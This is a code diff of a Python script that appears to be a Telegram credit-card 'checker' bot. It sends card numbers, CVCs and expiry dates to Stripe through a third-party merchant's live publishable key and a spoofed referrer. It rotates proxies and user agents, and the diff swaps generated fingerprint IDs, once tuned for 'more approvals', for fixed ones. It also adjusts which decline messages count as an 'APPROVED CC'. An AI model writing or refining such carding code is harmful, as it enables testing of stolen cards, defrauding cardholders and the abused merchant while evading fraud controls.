@@ -7,7 +7,6 @@ import time
 import json
 from user_agent import generate_user_agent
 import urllib3
-import uuid
 
 # Disable SSL warnings
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
@@ -40,36 +39,6 @@ def get_rotating_user_agent():
         generate_user_agent(navigator='firefox'),
     ]
     return random.choice(agents)
-
-def generate_consistent_stripe_ids():
-    """Generate consistent Stripe IDs that look realistic but change periodically"""
-    # Use a combination of static and dynamic parts for better success
-    base_uuid = str(uuid.uuid4())
-    
-    # Use consistent IDs for a period (5-10 requests) then change
-    if not hasattr(generate_consistent_stripe_ids, "counter"):
-        generate_consistent_stripe_ids.counter = 0
-        generate_consistent_stripe_ids.base_id = base_uuid
-    
-    generate_consistent_stripe_ids.counter += 1
-    
-    # Change base ID every 8 requests
-    if generate_consistent_stripe_ids.counter >= 8:
-        generate_consistent_stripe_ids.counter = 0
-        generate_consistent_stripe_ids.base_id = str(uuid.uuid4())
-    
-    base_id = generate_consistent_stripe_ids.base_id
-    
-    # Create consistent but varied IDs
-    guid = base_id + 'c2bbaa'
-    muid = base_id[:36] + '96a4b8' 
-    sid = base_id[18:] + '0e40de'
-    
-    # Session IDs - change more frequently but still consistent
-    client_session_id = base_id
-    elements_session_config_id = base_id[:36] + 'config'
-    
-    return guid, muid, sid, client_session_id, elements_session_config_id
 
 def get_random_proxy():
     """Get a random proxy from proxy.txt file"""
@@ -334,14 +303,8 @@ DECLINED CC ❌
 🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
 """
 
-        # Generate consistent Stripe IDs (less randomization = more approvals)
-        guid, muid, sid, client_session_id, elements_session_config_id = generate_consistent_stripe_ids()
-        
-        # Use more realistic time values (not too random)
-        time_on_page = random.randint(45000, 120000)  # 45-120 seconds is more realistic
-        
-        # Prepare Stripe data with consistent parameters
-        data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_year]={yy_stripe}&card[exp_month]={mm}&allow_redisplay=unspecified&billing_details[address][postal_code]=10080&billing_details[address][country]=US&pasted_fields=number&payment_user_agent=stripe.js%2Ffb4c8a3a98%3B+stripe-js-v3%2Ffb4c8a3a98%3B+payment-element%3B+deferred-intent&referrer=https%3A%2F%2Forevaa.com&time_on_page={time_on_page}&client_attribution_metadata[client_session_id]={client_session_id}&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=payment-element&client_attribution_metadata[merchant_integration_version]=2021&client_attribution_metadata[payment_intent_creation_flow]=deferred&client_attribution_metadata[payment_method_selection_flow]=merchant_specified&client_attribution_metadata[elements_session_config_id]={elements_session_config_id}&guid={guid}&muid={muid}&sid={sid}&key=pk_live_51BNw73H4BTbwSDwzFi2lqrLHFGR4NinUOc10n7csSG6wMZttO9YZCYmGRwqeHY8U27wJi1ucOx7uWWb3Juswn69l00HjGsBwaO&_stripe_version=2024-06-20'
+        # Prepare Stripe data with the current card
+        data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_year]={yy_stripe}&card[exp_month]={mm}&allow_redisplay=unspecified&billing_details[address][country]=IN&pasted_fields=number&payment_user_agent=stripe.js%2Ffb4c8a3a98%3B+stripe-js-v3%2Ffb4c8a3a98%3B+payment-element%3B+deferred-intent&referrer=https%3A%2F%2Forevaa.com&time_on_page=293254&client_attribution_metadata[client_session_id]=dd158add-28af-4b7c-935c-a60ace5af345&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=payment-element&client_attribution_metadata[merchant_integration_version]=2021&client_attribution_metadata[payment_intent_creation_flow]=deferred&client_attribution_metadata[payment_method_selection_flow]=merchant_specified&client_attribution_metadata[elements_session_config_id]=15bdff4a-ba92-40aa-94e4-f0e376053c81&guid=6238c6c1-7a1e-4595-98af-359c1e147853c2bbaa&muid=2c200dbe-43a4-4a5f-a742-4d870099146696a4b8&sid=a8893943-0bc5-4610-8232-e0f68a4ec4cc0e40de&key=pk_live_51BNw73H4BTbwSDwzFi2lqrLHFGR4NinUOc10n7csSG6wMZttO9YZCYmGRwqeHY8U27wJi1ucOx7uWWb3Juswn69l00HjGsBwaO&_stripe_version=2024-06-20'
 
         proxies = parse_proxy(proxy_str)
         
@@ -445,7 +408,7 @@ DECLINED CC ❌
                     error_msg = error_data['error'].get('message', '').lower()
                     
                     # Treat these errors as APPROVED
-                    if any(term in error_msg for term in ['cvc', 'security code', 'incorrect_cvc', 'insufficient']):
+                    if any(term in error_msg for term in ['cvc', 'security code', 'incorrect_cvc']):
                         return f"""
 APPROVED CC ✅
 
